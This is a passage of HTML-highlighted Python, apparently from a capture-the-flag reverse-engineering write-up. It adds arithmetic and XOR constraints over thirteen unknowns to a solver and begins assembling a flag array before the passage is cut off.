number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">58124</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8186</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21253</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">38524</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48323</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20556</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">56056</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">18568</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12995</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">39260</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25329</span> <span class=\"token operator\">==</span> <span class=\"token number\">6732474</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token number\">42567</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">17743</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">47827</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10246</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16284</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39390</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">11803</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">60332</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">18491</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">4795</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">25636</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token number\">16780</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">62345</span> <span class=\"token operator\">==</span> <span class=\"token number\">14020739</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10968</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">31780</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">31857</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token number\">61983</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">31048</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">20189</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12337</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">25945</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">7064</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token number\">25369</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">54893</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">59949</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">12441</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">14434062</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">16689</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>      <span class=\"token number\">10279</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">32918</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">57155</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">26571</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15086</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">22986</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">23349</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16381</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">23173</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">40224</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">31751</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8421</span> <span class=\"token operator\">==</span> <span class=\"token number\">7433598</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">28740</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">64696</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">60470</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">14752</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">1287</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">35272</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">49467</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">33788</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">20606</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">44874</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19764</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">48342</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">56511</span> <span class=\"token operator\">==</span> <span class=\"token number\">7989404</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">28978</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>      <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">23120</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22802</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">31533</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">39287</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48576</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">28542</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">43265</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">22365</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">61108</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2823</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">30343</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>      <span class=\"token number\">14780</span> <span class=\"token operator\">==</span> <span class=\"token number\">3504803</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">22466</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">55999</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">53658</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">47160</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">12511</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">59807</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">46242</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">3052</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">25279</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>      <span class=\"token number\">30202</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">22698</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">33480</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16757</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">11003580</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">57492</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13421</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">13941</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">48092</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">38310</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">9884</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>      <span class=\"token number\">45500</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">19233</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">58274</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36175</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">18568</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">49694</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">9473</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">25546210</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">23355</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">50164</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">34618</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>      <span class=\"token number\">52703</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">36245</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">46648</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">4858</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">41846</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">27122</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">42058</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15676</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">31863</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">62510</span> <span class=\"token operator\">==</span> <span class=\"token number\">11333836</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30523</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">7990</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39058</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">57549</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">53440</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">4275</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48863</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>      <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">55436</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">2624</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13652</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">62231</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">19456</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">13195</span> <span class=\"token operator\">==</span> <span class=\"token number\">13863722</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>text<span class=\"token operator\">=</span><span class=\"token number\">47</span><span class=\"token operator\">*</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    text<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token 